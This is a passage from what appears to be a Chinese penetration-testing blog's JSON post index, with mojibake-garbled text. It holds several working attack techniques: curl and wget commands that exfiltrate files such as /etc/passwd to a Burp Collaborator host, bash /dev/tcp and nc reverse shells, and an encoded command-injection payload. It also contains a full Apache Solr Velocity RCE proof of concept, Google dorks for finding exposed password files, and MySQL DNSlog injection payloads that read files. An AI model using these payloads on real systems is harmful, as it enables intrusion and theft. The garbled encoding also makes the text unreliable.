`whoami`.dnslog 0X01 curlä¸Šä¼ æ–‡ä»¶ æˆ‘ä»¬å¯ä»¥ç”¨ -X POST æ¥ç”³æ˜æˆ‘ä»¬çš„è¯·æ±‚æ–¹æ³•ï¼Œç”¨ -F â€œfile=@FILE_PATHâ€œ çš„è¯·ç¤ºï¼Œä¼ è¾“æ–‡ä»¶å³å¯ã€‚ 12345# åˆ©ç”¨Burpï¼šcurl -X POST -F xx=@/Users/vk/Downloads/1.txt http://a8jmrauzh2kxy56bhk99xwhh78dy1n.burpcollaborator.net -v# åˆ©ç”¨NCï¼šcurl -X POST -F xx=@/Users/vk/Downloads/1.txt http://127.0.0.1:9999 -v æ‰“å¼€Burpä¸»ç•Œé¢ â€“&gt;èœå•ï¼ˆBurpï¼‰â€“&gt;Burp Collaboraor Client â€“ &gt; ç‚¹å‡» Copy to Clipboard 0X02 Wget wgetæŒ‡å®šheaderå¤´æŸ¥çœ‹æ—¥å¿—å›æ˜¾ 1wget -d --header=&quot;User-Agent: $(cat /etc/passwd|tail -n 1)&quot; http://127.0.0.1/1.php 0X03 åå¼¹shell ç”¨ncè¿”å›ä¸€ä¸ªäº¤äº’å¼çš„shell 12345678# æœåŠ¡å™¨ç«¯æ‰§è¡Œnc -vv -lp 8888# å‘½ä»¤æ‰§è¡Œå¤„æ‰§è¡Œbash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1# payloadcommand=111%0d%0abash+-i+&gt;%26+/dev/tcp/127.0.0.1/8888+0&gt;%261","categories":[{"name":"WEBå®‰å…¨","slug":"WEBå®‰å…¨","permalink":"http://www.vkxss.top/categories/WEBå®‰å…¨/"}],"tags":[{"name":"WEBæ¸—é€æµ‹è¯•","slug":"WEBæ¸—é€æµ‹è¯•","permalink":"http://www.vkxss.top/tags/WEBæ¸—é€æµ‹è¯•/"}]},{"title":"Apache_Solr_Velocityæ¨¡æ¿æ³¨å…¥RCEæ¼æ´","slug":"æ¸—é€æµ‹è¯•-Apache_Solr_Velocityæ¨¡æ¿æ³¨å…¥RCEæ¼æ´","date":"2019-10-31T07:30:08.000Z","updated":"2019-11-01T03:31:26.517Z","comments":true,"path":"2019/10/31/æ¸—é€æµ‹è¯•-Apache_Solr_Velocityæ¨¡æ¿æ³¨å…¥RCEæ¼æ´/","link":"","permalink":"http://www.vkxss.top/2019/10/31/æ¸—é€æµ‹è¯•-Apache_Solr_Velocityæ¨¡æ¿æ³¨å…¥RCEæ¼æ´/","excerpt":"","text":"0x00 å‰è¨€ 0x01 æ¼æ´è¯¦æƒ… 0x02 POC 0x03 å¤ç° 0x00 å‰è¨€ Solræ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ä¼ä¸šçº§æœç´¢åº”ç”¨æœåŠ¡å™¨ï¼Œå®ƒå¯¹å¤–æä¾›ç±»ä¼¼äºWeb-serviceçš„APIæ¥å£ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡httpè¯·æ±‚ï¼Œå‘æœç´¢å¼•æ“æœåŠ¡å™¨æäº¤ä¸€å®šæ ¼å¼çš„XMLæ–‡ä»¶ï¼Œç”Ÿæˆç´¢å¼•ï¼›ä¹Ÿå¯ä»¥é€šè¿‡Http Getæ“ä½œæå‡ºæŸ¥æ‰¾è¯·æ±‚ï¼Œå¹¶å¾—åˆ°XMLæ ¼å¼çš„è¿”å›ç»“æœã€‚ ræ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ä¼ä¸šçº§æœç´¢åº”ç”¨æœåŠ¡å™¨ï¼Œå®ƒå¯¹å¤–æä¾›ç±»ä¼¼äºWeb-serviceçš„APIæ¥å£ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡httpè¯·æ±‚ï¼Œå‘æœç´¢å¼•æ“æœåŠ¡å™¨æäº¤ä¸€å®šæ ¼å¼çš„XMLæ–‡ä»¶ï¼Œç”Ÿæˆç´¢å¼•ï¼›ä¹Ÿå¯ä»¥é€šè¿‡Http Getæ“ä½œæå‡ºæŸ¥æ‰¾è¯·æ±‚ï¼Œå¹¶å¾—åˆ°XMLæ ¼å¼çš„è¿”å›ç»“æœã€‚ 0x01 æ¼æ´è¯¦æƒ… è¯¥æ¼æ´çš„äº§ç”ŸåŸå› ï¼š 1ã€æ”»å‡»è€…å¯ä»¥ç›´æ¥è®¿é—®solr adminé¡µé¢,å¹¶å¯ä»¥é€šè¿‡æ„é€ postè¯·æ±‚æ¥ä¿®æ”¹èŠ‚ç‚¹çš„é…ç½®. 2.Apache Solré»˜è®¤é›†æˆVelocityResponseWriteræ’ä»¶ï¼Œåœ¨è¯¥æ’ä»¶çš„åˆå§‹åŒ–å‚æ•°ä¸­çš„params.resource.loader.enabledè¿™ä¸ªé€‰é¡¹æ˜¯ç”¨æ¥æ§åˆ¶æ˜¯å¦å…è®¸å‚æ•°èµ„æºåŠ è½½å™¨åœ¨Solrè¯·æ±‚å‚æ•°ä¸­æŒ‡å®šæ¨¡ç‰ˆï¼Œé»˜è®¤è®¾ç½®æ˜¯falseã€‚ 3ã€å½“params.resource.loader.enabledè®¾ç½®ä¸ºtrueï¼Œå°†å…è®¸ç”¨æˆ·é€šè¿‡è®¾ç½®è¯·æ±‚ä¸­çš„å‚æ•°æ¥æŒ‡å®šç›¸å…³èµ„æºçš„åŠ è½½ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ä¸€ä¸ªæ¶æ„çš„è¯·æ±‚ï¼Œåœ¨æœåŠ¡å™¨ä¸Šè¿›è¡Œå‘½ä»¤æ‰§è¡Œ,ä»è€Œè·å–æœåŠ¡å™¨çš„æƒé™ã€‚ 0x02 POC123456789101112131415161718192021222324252627282930313233343536373839404142æ¥è‡ªï¼šhttps://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt Apache Solr RCE via Velocity templateSet &quot;params.resource.loader.enabled&quot; as true.Request:========================================================================POST /solr/test/config HTTP/1.1Host: solr:8983Content-Type: application/jsonContent-Length: 259&#123; &quot;update-queryresponsewriter&quot;: &#123; &quot;startup&quot;: &quot;lazy&quot;, &quot;name&quot;: &quot;velocity&quot;, &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;, &quot;template.base.dir&quot;: &quot;&quot;, &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;, &quot;params.resource.loader.enabled&quot;: &quot;true&quot; &#125;&#125;========================================================================RCE via velocity templateRequest:========================================================================GET /solr/test/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1Host: localhost:8983========================================================================Response:========================================================================HTTP/1.1 200 OKContent-Type: text/html;charset=utf-8Content-Length: 56 0 uid=8983(solr) gid=8983(solr) groups=8983(solr)========================================================================0x03 å¤ç° ç¯å¢ƒæ­å»º 1234ä¸‹è½½æœ€æ–°çš„Solrä¸‹è½½åœ°å€:https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/8.2.0/solr-8.2.0.zipè§£å‹ä»¥å,è¿›å…¥solr-8.2.0/binç›®å½•ä½¿ç”¨./solr -e dih -forceå¼€å¯ç¤ºä¾‹app payload: 12/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23endæ³¨æ„ï¼šæ¼æ´éœ€è¦Content-Typeä¸ºapplication/json åå¼¹shellï¼š å¯ä»¥åå¼¹shellï¼Œä½¿ç”¨ncå‘½ä»¤ï¼š nc -e /bin/bash ip portæˆåŠŸåå¼¹shell","categories":[{"name":"WEBå®‰å…¨","slug":"WEBå®‰å…¨","permalink":"http://www.vkxss.top/categories/WEBå®‰å…¨/"}],"tags":[{"name":"WEBæ¸—é€æµ‹è¯•","slug":"WEBæ¸—é€æµ‹è¯•","permalink":"http://www.vkxss.top/tags/WEBæ¸—é€æµ‹è¯•/"}]},{"title":"CVE-2019-11043-PHPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°","slug":"CVE-2019-11043","date":"2019-10-25T07:30:08.000Z","updated":"2019-11-01T05:22:25.327Z","comments":true,"path":"2019/10/25/CVE-2019-11043/","link":"","permalink":"http://www.vkxss.top/2019/10/25/CVE-2019-11043/","excerpt":"","text":"0X00 ç®€ä»‹ 0X01 CVEç¼–å· 0X02 æ¼æ´å¨èƒç­‰çº§ 0X03 å½±å“èŒƒå›´ 0X04 æ¼æ´å¤ç° 0X05 æ¼æ´æ€»ç»“ 0X06 Reference 0X00 ç®€ä»‹ 9 æœˆ 26 æ—¥ï¼Œå®‰å…¨ç ”ç©¶å‘˜ Andrew Danauå‘PHP æäº¤ä¸€æšè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œä½¿ç”¨æŸäº›ç‰¹å®šé…ç½®çš„Nginx + PHP-FPM çš„æœåŠ¡å™¨å­˜åœ¨æ¼æ´ï¼Œå¯å…è®¸æ”»å‡»è€…è¿œç¨‹æ‰§è¡Œä»£ç ã€‚è¯¥æ¼æ´EXPäº10æœˆ22æ—¥å…¬å¼€ã€‚åŸå› æ˜¯ï¼šNginx ä¸Š fastcgi_split_path_info åœ¨å¤„ç†å¸¦æœ‰ %0a çš„è¯·æ±‚æ—¶ï¼Œä¼šå› ä¸ºé‡åˆ°æ¢è¡Œç¬¦ \\n å¯¼è‡´ PATH_INFO ä¸ºç©ºã€‚è€Œ php-fpm åœ¨å¤„ç† PATH_INFO ä¸ºç©ºçš„æƒ…å†µä¸‹ï¼Œå­˜åœ¨é€»è¾‘ç¼ºé™·ã€‚æ”»å‡»è€…é€šè¿‡ç²¾å¿ƒçš„æ„é€ å’Œåˆ©ç”¨ï¼Œå¯ä»¥å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ 0X01 CVEç¼–å· CVE-2019-11043 0X02 æ¼æ´å¨èƒç­‰çº§ é«˜å± 0X03 å½±å“èŒƒå›´ Nginx+ php-fpm çš„æœåŠ¡å™¨ï¼Œåœ¨ä½¿ç”¨å¦‚ä¸‹é…ç½®çš„æƒ…å†µä¸‹ï¼Œéƒ½å¯èƒ½å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ 1234567location ~ [^/]\\.php(/|$) &#123; fastcgi_split_path_info^(.+?\\.php)(/.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_pass php:9000; ... &#125;&#125; 0X04 æ¼æ´å¤ç° åœ¨EXPå…¬å¸ƒçš„æ—¶å€™ï¼Œvulhubä¹Ÿå‘å¸ƒäº†ç›¸åº”çš„é•œåƒï¼Œæœ¬æ¬¡å®éªŒä½¿ç”¨è¯¥é•œåƒè¿›è¡Œå¤ç°ã€‚ https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043 å°†æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ä¹‹åï¼Œæ­å»ºç¯å¢ƒ: docker-compose up -d Nginx + php-fpm çš„æœåŠ¡å™¨ï¼Œåœ¨ä½¿ç”¨å¦‚ä¸‹é…ç½®çš„æƒ…å†µä¸‹ï¼Œéƒ½å¯èƒ½å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ è¯¦æƒ…å‚è€ƒReference 0X05 æ¼æ´æ€»ç»“ åˆ©ç”¨æ¡ä»¶è‹›åˆ»ï¼Œå› ä¸ºè§¦å‘æ¼æ´çš„é…ç½®ä¸æ˜¯é»˜è®¤é…ç½®ã€‚ å³ä½¿æ˜¯è§¦å‘æ¼æ´çš„é…ç½®ï¼Œä»æœ‰å¤±è´¥çš„æœºç‡ï¼Œæ‰§è¡Œå‘½ä»¤æ—¶æˆåŠŸç‡50%çš„æ ·å­ã€‚ 0X06 Reference å‚è€ƒé“¾æ¥ï¼šhttps://github.com/vkbiu/CVE/tree/master/CVE-2019-11043","categories":[{"name":"CVE-2019","slug":"CVE-2019","permalink":"http://www.vkxss.top/categories/CVE-2019/"}],"tags":[{"name":"CVE-2019-16759","slug":"CVE-2019-16759","permalink":"http://www.vkxss.top/tags/CVE-2019-16759/"}]},{"title":"google_hackè¯­æ³•","slug":"æ¸—é€æµ‹è¯•-google_hackè¯­æ³•","date":"2019-10-24T04:25:40.000Z","updated":"2019-12-12T07:58:26.878Z","comments":true,"path":"2019/10/24/æ¸—é€æµ‹è¯•-google_hackè¯­æ³•/","link":"","permalink":"http://www.vkxss.top/2019/10/24/æ¸—é€æµ‹è¯•-google_hackè¯­æ³•/","excerpt":"","text":"google hackè¯­æ³• ç®€ä»‹åœ¨æ—¥ç«™çš„æ—¶å€™googleæœç´¢èƒ½è®©æˆ‘ä»¬è·å¾—æ„æƒ³ä¸åˆ°çš„ä¿¡æ¯ï¼Œå¯ä»¥æ‰¾åˆ°ç›®æ ‡ç«™ç‚¹çš„æ•æ„Ÿä¿¡æ¯ã€‚åå°ç­‰ç­‰ google hackè¯­æ³•åˆ—è¡¨åˆçº§è¯­æ³•è¡¨ 123456789æ¨¡ç³Šæœç´¢-ä¾‹å¦‚ï¼šå¢æœ¬ä¼Ÿç²¾ç¡®æœç´¢-ä¾‹å¦‚ï¼š\"å¢æœ¬ä¼Ÿ\"é€šé…ç¬¦*-ä¾‹å¦‚ï¼šä½•å®‰åœ»*é€šé…ç¬¦.-ä¾‹å¦‚ï¼šå¤§å²­å±±ä¸­å­¦. PS:.çš„é€šé…ç¬¦ç”¨äºåŒ¹é…å­—ç¬¦å¸ƒå°”é€»è¾‘-ä¾‹å¦‚ï¼šå¤§å²­å±±ä¸­å­¦ and ä½•å®‰åœ»é€»è¾‘æˆ–|-ä¾‹å¦‚ï¼šç»¿ç›Ÿ (éƒ‘å·)é€»è¾‘é-ä¾‹å¦‚ï¼šä½•å®‰åœ» -åšå®¢å›­çº¦æŸæ¡ä»¶-ä¾‹å¦‚ï¼šé»é¢–å¸Œ +è·å¥–æ•°å­—èŒƒå›´-ä¾‹å¦‚ï¼šç»¿ç›Ÿ+2009å¹´ 2015å¹´ é«˜çº§è¯­æ³•è¡¨ 12345678910è®¿é—®åŸºæœ¬ä¿¡æ¯-ä¾‹å¦‚ï¼šinfo:baidu.comæ ‡é¢˜æœç´¢-ä¾‹å¦‚ï¼šintitle:åå°ç™»å½•æ­£æ–‡æœç´¢-ä¾‹å¦‚ï¼šintext:èº«ä»½è¯å¤§å…¨urlæœç´¢-ä¾‹å¦‚ï¼šinurl:google.comé”šé“¾é“¾æ¥æœç´¢-ä¾‹å¦‚ï¼šinanchor:googleæ–‡æ¡£ç±»å‹é™å®šæœç´¢-ä¾‹å¦‚ï¼šintext:èº«ä»½è¯å¤§å…¨ filetype:xlsç¼“å­˜æœç´¢-lä¾‹å¦‚ï¼šcache:secqun.orgç›¸å…³ç½‘å€æœç´¢-ä¾‹å¦‚ï¼šrelated:google hackingç›¸å…³è¿æ¥æœç´¢-ä¾‹å¦‚ï¼šlink:baidu.comä¸æŒ‡å®šåŸŸåç›¸å…³çš„æœç´¢ï¼šsite:baidu.com é«˜çº§åˆ©ç”¨ 123456inurl:robots.txtintitle:ç™»å½• intext:username inurl:login.jspinurl:8080 inurl:jspfiletype:sql site:com and \"insert into admin 2014\"inurl:jsp/demo.jspinurl:update set inurl:where æ¸—é€åˆ©ç”¨ï¼š 1234567891011121314151617181920212223242526272829â€œLogin: â€ â€œpassword =â€ filetype: xls ( æœç´¢å­˜å‚¨åœ¨excelæ–‡ä»¶ä¸­å«æœ‰passwordçš„æ•°æ®)ã€‚allinurl: auth_user_file.txt (æœç´¢åŒ…å«åœ¨æœåŠ¡å™¨ä¸Šçš„ auth_user_file.txt çš„æ–‡ä»¶ï¼‰ã€‚filetype: xls inurl: â€œpassword.xlsâ€ (æŸ¥æ‰¾ ç”¨æˆ·åå’Œå¯†ç ä»¥excelæ ¼å¼ï¼‰è¿™ä¸ªå‘½ä»¤å¯ä»¥å˜ä¸ºâ€œadmin.xlsâ€.intitle: login password (è·å–ç™»é™†é¡µé¢çš„è¿æ¥ï¼Œç™»é™†å…³é”®è¯åœ¨æ ‡é¢˜ä¸­ã€‚)intitle: â€œIndex ofâ€ master.passwd (å¯†ç é¡µé¢ç´¢å¼•)index of / backup ( æœç´¢æœåŠ¡å™¨ä¸Šçš„å¤‡ä»½æ–‡ä»¶ï¼‰intitle: index.of people.lst (åŒ…å«people.listçš„ç½‘é¡µï¼‰intitle: index.of passwd.bak ( å¯†ç å¤‡ä»½æ–‡ä»¶)intitle: â€œIndex ofâ€ pwd.db (æœç´¢æ•°æ®åº“å¯†ç æ–‡ä»¶).intitle: â€œIndex of .. etcâ€ passwd (å®‰è£…å¯†ç å»ºç«‹é¡µé¢ç´¢å¼•ï¼‰.index.of passlist.txt (ä»¥çº¯æ–‡æœ¬çš„å½¢å¼åŠ è½½åŒ…å«passlist.txtçš„é¡µé¢).index.of.secret (æ˜¾ç¤ºåŒ…å«æœºå¯†çš„æ–‡æ¡£ï¼Œ.govç±»å‹çš„ç½‘ç«™é™¤å¤–) è¿˜å¯ä»¥ä½¿ç”¨: index.of.privatefiletype: xls username password email (æŸ¥æ‰¾è¡¨æ ¼ä¸­å«æœ‰usernameå’Œpasswordçš„åˆ—çš„xlsæ–‡ä»¶).â€# PhpMyAdmin MySQL-Dumpâ€ filetype: txt (åˆ—å‡ºåŒ…å«æ•æ„Ÿæ•°æ®çš„åŸºäºphpçš„é¡µé¢)inurl: ipsec.secrets-history-bugs (åŒ…å«åªæœ‰è¶…çº§ç”¨æˆ·æ‰æœ‰çš„æ•æ„Ÿæ•°æ®). è¿˜æœ‰ä¸€ç§æ—§çš„ç”¨æ³• inurl: ipsec.secrets â€œholds shared secretsâ€inurl: ipsec.conf-intitle: manpageinurl: â€œwvdial.confâ€ intext: â€œpasswordâ€ (æ˜¾ç¤ºåŒ…å«ç”µè¯å·ç ï¼Œç”¨æˆ·åå’Œå¯†ç çš„è¿æ¥ã€‚ï¼‰inurl: â€œuser.xlsâ€ intext: â€œpasswordâ€ (æ˜¾ç¤ºç”¨æˆ·åå’Œå¯†ç å­˜å‚¨åœ¨xlsçš„é“¾æ¥ã€‚)filetype: ldb admin (webæœåŠ¡å™¨æŸ¥æ‰¾å­˜å‚¨åœ¨æ•°æ®åº“ä¸­æ²¡æœ‰å‘—googledorkåˆ å»çš„å¯†ç ã€‚ï¼‰inurl: search / admin.php (æŸ¥æ‰¾adminç™»é™†çš„phpé¡µé¢). å¦‚æœå¹¸è¿çš„è¯ï¼Œè¿˜å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªç®¡ç†å‘˜é…ç½®ç•Œé¢åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·ã€‚inurl: password.log filetype:log (æŸ¥æ‰¾ç‰¹å®šé“¾æ¥çš„æ—¥å¿—æ–‡ä»¶ã€‚)filetype: reg HKEY_CURRENT_USER username (åœ¨HCU (Hkey_Current_User)è·¯å¾„ä¸­æŸ¥æ‰¾æ³¨å†Œè¡¨æ–‡ä»¶(registyry)ã€‚)â€œHttp://username: password @ www â€¦â€ filetype: bak inurl: â€œhtaccess | passwd | shadow | ht usersâ€(æŸ¥æ‰¾å¤‡ä»½æ–‡ä»¶ä¸­çš„ç”¨æˆ·åå’Œå¯†ç ã€‚)filetype:ini ws_ftp pwd (é€šè¿‡ws_ftp.ini æ–‡ä»¶æŸ¥æ‰¾adminç”¨æˆ·çš„å¯†ç )intitle: â€œIndex ofâ€ pwd.db (æŸ¥æ‰¾åŠ å¯†çš„ç”¨æˆ·åå’Œå¯†ç ï¼‰inurl:admin inurl:backup intitle:index.of (æŸ¥æ‰¾å…³é”®è¯åŒ…å«adminå’Œbackupçš„ç›®å½•ã€‚)â€œIndex of/â€ â€œParent Directoryâ€ â€œWS _ FTP.iniâ€ filetype:ini WS _ FTP PWD (WS_FTP é…ç½®æ–‡ä»¶ï¼Œ å¯ä»¥è·å–FTPæœåŠ¡å™¨çš„è¿›å…¥æƒé™)ext:pwd inurl:(service|authors|administrators|users) â€œ# -FrontPage-â€filetype: sql ( â€œpasswd values *â€ |â€ password values *â€ | â€œpass values **â€œ) æŸ¥æ‰¾å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„sqlä»£ç å’Œå¯†ç ã€‚ )","categories":[{"name":"WEBå®‰å…¨","slug":"WEBå®‰å…¨","permalink":"http://www.vkxss.top/categories/WEBå®‰å…¨/"}],"tags":[{"name":"WEBæ¸—é€æµ‹è¯•","slug":"WEBæ¸—é€æµ‹è¯•","permalink":"http://www.vkxss.top/tags/WEBæ¸—é€æµ‹è¯•/"}]},{"title":"Mysql-Dnslogç›²æ³¨","slug":"æ¸—é€æµ‹è¯•-Mysql-Dnslogç›²æ³¨","date":"2019-10-21T06:25:40.000Z","updated":"2019-10-21T17:01:56.359Z","comments":true,"path":"2019/10/21/æ¸—é€æµ‹è¯•-Mysql-Dnslogç›²æ³¨/","link":"","permalink":"http://www.vkxss.top/2019/10/21/æ¸—é€æµ‹è¯•-Mysql-Dnslogç›²æ³¨/","excerpt":"","text":"0x00 ä¸ºä»€ä¹ˆç”¨Dnslogç›²æ³¨ 0x01 åˆ©ç”¨æ¡ä»¶ 0x02 å¦‚ä½•æŸ¥çœ‹mysqlæ˜¯å¦å¼€å¯äº†æ–‡ä»¶å¯¼å…¥å¯¼å‡ºï¼Ÿ 0x03 æ„é€ æ”»å‡»Payload 0X04 Reference 0x00 ä¸ºä»€ä¹ˆç”¨Dnslogç›²æ³¨ å¯¹äºSQLç›²æ³¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¸ƒå°”æˆ–è€…æ—¶é—´ç›²æ³¨è·å–å†…å®¹ï¼Œä½†æ˜¯æ•´ä¸ªè¿‡ç¨‹æ•ˆç‡ä½ï¼Œéœ€è¦å‘é€å¾ˆå¤šçš„è¯·æ±‚è¿›è¡Œåˆ¤æ–­ï¼Œå®¹æ˜“è§¦å‘å®‰å…¨è®¾å¤‡çš„é˜²æŠ¤ï¼ŒDnslogç›²æ³¨å¯ä»¥å‡å°‘å‘é€çš„è¯·æ±‚ï¼Œç›´æ¥å›æ˜¾æ•°æ®å®ç°æ³¨å…¥ã€‚ 0x01 åˆ©ç”¨æ¡ä»¶ æ•°æ®åº“çš„load_fileå‡½æ•°å¿…é¡»å¯ç”¨ï¼Œä¹Ÿå°±æ˜¯æ•°æ®åº“ç”¨æˆ·å¿…é¡»è¦æœ‰file_privæƒé™ å…¶æ¬¡å°±æ˜¯mysqlçš„secure_file_privä¸ä¸ºNULL,æœ‰äº›é«˜ç‰ˆæœ¬çš„mysqlä¸­çš„secure_file_privé»˜è®¤ä¸ºNULL secure_file_privç‰¹æ€§secure_file_privå‚æ•°æ˜¯ç”¨æ¥é™åˆ¶LOAD DATA, SELECT â€¦ OUTFILE, and LOAD_FILE()ä¼ åˆ°å“ªä¸ªæŒ‡å®šç›®å½•çš„ã€‚ 0x02 å¦‚ä½•æŸ¥çœ‹mysqlæ˜¯å¦å¼€å¯äº†æ–‡ä»¶å¯¼å…¥å¯¼å‡ºï¼Ÿ åœ¨MySQL 5.5.53ç‰ˆæœ¬ä¹‹å‰ï¼Œè¿™ä¸ªå˜é‡é»˜è®¤ä¸ºç©ºï¼Œå› æ­¤æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨è¿™äº›å‡½æ•°ã€‚ä½†æ˜¯åœ¨è¯¥ç‰ˆæœ¬ä¹‹åï¼ŒNULLå€¼ä¼šç¦ç”¨è¿™äº›å‡½æ•°ã€‚æˆ‘ä»¬å¯ä½¿ç”¨å…¶ä¸­çš„ä¸€ç§æ–¹æ³•æ¥æ£€æŸ¥è¿™ä¸ªå˜é‡çš„å€¼ã€‚Secure_file_privæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ä¸”æ˜¯ä¸€ä¸ªåªè¯»å˜é‡ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨è¿è¡Œæ—¶æ— æ³•æ›´æ”¹ã€‚ ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹ï¼š mysql&gt;show global variables like â€˜%secure%â€™; secure_file_privçš„å€¼ä¸ºnull ï¼Œè¡¨ç¤ºé™åˆ¶mysqld ä¸å…è®¸å¯¼å…¥|å¯¼å‡ºã€‚ å½“secure_file_privçš„å€¼ä¸º/tmp/ ï¼Œè¡¨ç¤ºé™åˆ¶mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨/tmp/ç›®å½•ä¸‹ã€‚ å½“secure_file_privçš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶ã€‚ æ€»ç»“ä¸‹å¦‚ä½•ä¿®æ”¹secure_file_privçš„å€¼ï¼Ÿ windowsä¸‹ï¼šä¿®æ”¹my.ini åœ¨[mysqld]å†…åŠ å…¥secure_file_priv = linuxä¸‹ï¼šä¿®æ”¹my.cnf åœ¨[mysqld]å†…åŠ å…¥secure_file_priv = MYSQLæ–°ç‰¹æ€§secure_file_privå¯¹è¯»å†™æ–‡ä»¶çš„å½±å“ ç„¶åé‡å¯mysqlï¼Œå†æŸ¥è¯¢secure_file_priv 0x03 æ„é€ æ”»å‡»Payload æ™®é€špayloadï¼š 123456select load_file(concat(&apos;\\\\\\\\&apos;,(select database()),&apos;.xxxx.ceye.io\\\\abc&apos;))concatæ˜¯å­—ç¬¦ä¸²æ‹¼æ¥ï¼›ç”¨4ä¸ª,å› ä¸º\\\\ä¼šè¢«è½¬ä¹‰ä¸º:\\database()å°±æ˜¯ä½ è¦åšSQLæ³¨å…¥æŸ¥è¯¢çš„åœ°æ–¹&apos;.xxxx.ceye.io\\abc&apos;å°±æ˜¯ä½ çš„dnslogå¹³å°ç»™ä½ çš„åŸŸåuncè·¯å¾„ ç½‘ç»œå…±äº«æ–‡ä»¶æ–¹å¼ \\\\dnslog\\abcè¿™æ ·çš„è·¯å¾„ - ä¸Šé¢æ‹¼æ¥çš„ç»“æœå°±æ˜¯&quot;\\\\\\\\ schema_name.dnslog\\\\abc&quot;ï¼Œå…¶å®ç›¸å½“äºè®¿é—®äº†å¸¦æœ‰æ•°æ®åº“åç§°çš„ä¸‰çº§åŸŸåï¼Œè¢«dnslogæ•è·åˆ°äº†ã€‚ åŠ å¯†payload åˆ©ç”¨bur or select hex(â€œè¦åŠ å¯†çš„æ•°æ®â€)å³å¯. 1234åŠ å¯†å‰ï¼š select load_file(concat(&quot;\\\\\\\\&quot;,version(),&quot;.dnslog\\\\abc&quot;));16è¿›åˆ¶åŠ å¯†åï¼š select load_file(concat(0x5c5c5c5c,version(),0x6xxf62312e7xxb2e307xx36363xx63635c5c616263)); è¯»é…ç½®æ–‡ä»¶payload è¿™é‡Œæ„é€ ä¸‹payloadè¯»å–ï¼šC:\\phpStudy\\WWW\\phpinfo.php 12345678910111213é¦–å…ˆselect hex(&apos;C:\\\\phpStudy\\\\WWW\\\\phpinfo.php&apos;)å¾—åˆ°åŠ å¯†å­—ç¬¦ä¸²:433A5C70687053747564795C5757575C706870696E666F2E706870ç„¶åæ„é€ ä¸‹payload:select load_file(concat(0x5c5c5c5c,(select load_file(0x433A5C70687053747564795C5757575C706870696E666F2E706870)),0x6f6xxxxxx6b2e307xx363xxxxxc5c616263)); //è¿™é‡Œç”¨äº†ä¸¤ä¸ªload_fileå°±è§£å†³ä¸Šé¢æ‰€è¯´çš„é—®é¢˜äº†ã€‚ä½†æ˜¯ä½ è§‰å¾—ä¼šæˆåŠŸå— no no noå› ä¸ºæ–‡ä»¶å¸¦æœ‰æ¢è¡Œç¬¦è¿™æ˜¯ä¸ç¬¦åˆ åŸŸåè§„èŒƒçš„ é‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆåŠå‘¢ åŠ å¯†æ•°æ®å’¯ç”¨hex() ç»§ç»­æ„é€ payload:select load_file(concat(0x5c5c5c5c,hex((select load_file(0x433A5C70687053747564795C5757575C706870696E666F2E706870))),0x6f6f62xxxx66b2xxx78636xxxx5c5c616263)); å¤ç°å¦‚ä¸‹å›¾ï¼š 0X04 Reference- å‚è€ƒé“¾æ¥ï¼š https://xz.aliyun.com/t/3992#toc-1 https://www.freebuf.com/articles/web/201013.html https://www.t00ls.net/thread-44273-1-1.html","categories":[{"name":"WEBå®‰å…¨","slug":"WEBå®‰å…¨","permalink":"http://www.vkxss.top/categories/WEBå®‰å…¨/"}],"tags":[{"name":"WEBæ¸—é€æµ‹è¯•","slug":"WEBæ¸—é€æµ‹è¯•","permalink":"http://www.vkxss.top/tags/WEBæ¸—é€æµ‹è¯•/"}]},{"title":"nostromo nhttpd 